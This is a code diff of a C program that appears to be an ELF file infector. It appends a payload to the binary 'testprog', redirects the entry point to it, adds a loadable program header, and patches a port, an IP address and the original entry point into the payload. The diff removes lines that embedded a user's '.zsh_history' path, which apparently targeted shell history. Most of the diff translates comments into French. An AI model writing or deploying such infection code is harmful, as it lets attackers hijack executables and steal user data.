@@ -3,9 +3,6 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <sys/mman.h>
-#include <sys/stat.h>
-#include <sys/types.h>
 #include <arpa/inet.h>
 #include <elf.h>
 
@@ -25,9 +22,10 @@ uint16_t port = 0;
 uint32_t addr_ip = 0;
 
 int main(int argc, char *argv[], char *envp[]) {
-	port = htons(3002);
+    port = htons(3002);
     addr_ip = htonl(INADDR_ANY);
-	
+    printf("port: %#x %#x\n", port, addr_ip);
+
     int fd = open("testprog", O_RDWR);
     if (fd < 0) {
         perror("open");
@@ -51,7 +49,7 @@ int main(int argc, char *argv[], char *envp[]) {
         return 1;
     }
 
-    // Read the ELF header
+    // Lire le header ELF
     Elf64_Ehdr ehdr;
     if (pread(fd, &ehdr, sizeof(ehdr), 0) != sizeof(ehdr)) {
         perror("pread");
@@ -65,18 +63,18 @@ int main(int argc, char *argv[], char *envp[]) {
         return 1;
     }
 
-    // Determine the new entry point
+    // Déterminer le nouveau point d'entrée
     uint64_t old_entry_point = ehdr.e_entry;
     uint64_t new_entry_point = size;
 
-    // Add the payload to the end of the file
+    // Ajouter le payload à la fin du fichier
     if (pwrite(fd, payload_p, payload_size_p, size) != payload_size_p) {
         perror("pwrite");
         close(fd);
         return 1;
     }
 
-    // Update the entry point in the ELF header
+    // Mettre à jour le point d'entrée dans le header ELF
     ehdr.e_entry = new_entry_point;
     if (pwrite(fd, &ehdr, sizeof(ehdr), 0) != sizeof(ehdr)) {
         perror("pwrite");
@@ -84,7 +82,7 @@ int main(int argc, char *argv[], char *envp[]) {
         return 1;
     }
 
-    // Write the new program header for the payload
+    // Écrire le nouveau programme header pour le payload
     Elf64_Phdr new_phdr = {
         .p_type = PT_LOAD,
         .p_offset = size,
@@ -96,14 +94,14 @@ int main(int argc, char *argv[], char *envp[]) {
         .p_align = 0x1000
     };
 
-    // Append the new program header
+    // Ajouter le nouveau programme header
     if (pwrite(fd, &new_phdr, sizeof(new_phdr), ehdr.e_phoff + ehdr.e_phnum * sizeof(Elf64_Phdr)) != sizeof(new_phdr)) {
         perror("pwrite");
         close(fd);
         return 1;
     }
 
-    // Increment the number of program headers in the ELF header
+    // Incrémenter le nombre de programme headers dans le header ELF
     ehdr.e_phnum += 1;
     if (pwrite(fd, &ehdr, sizeof(ehdr), 0) != sizeof(ehdr)) {
         perror("pwrite");
@@ -111,16 +109,7 @@ int main(int argc, char *argv[], char *envp[]) {
         return 1;
     }
 
-
-	char *filepath = "/home/maxence/.zsh_history";
-	// Write the port and address IP to the end of the payload
-	if (pwrite(fd, filepath, sizeof(filepath), size + payload_size_p - 4 - 2 - 1024) != sizeof(filepath)) {
-		perror("pwrite");
-		close(fd);
-		return 1;
-	}
-
-    // Add the port and address IP to the payload
+    // Ajouter le port et l'adresse IP au payload
     if (pwrite(fd, &port, sizeof(port), size + payload_size_p - 4 - 2) != sizeof(port)) {
         perror("pwrite");
         close(fd);
@@ -133,7 +122,7 @@ int main(int argc, char *argv[], char *envp[]) {
         return 1;
     }
 
-    // Write the old entry point to the specified location in the payload
+    // Écrire l'ancien point d'entrée à l'emplacement spécifié dans le payload
     if (pwrite(fd, &old_entry_point, sizeof(old_entry_point), size + payload_size_p - 1190 - 4) != sizeof(old_entry_point)) {
         perror("pwrite");
         close(fd);
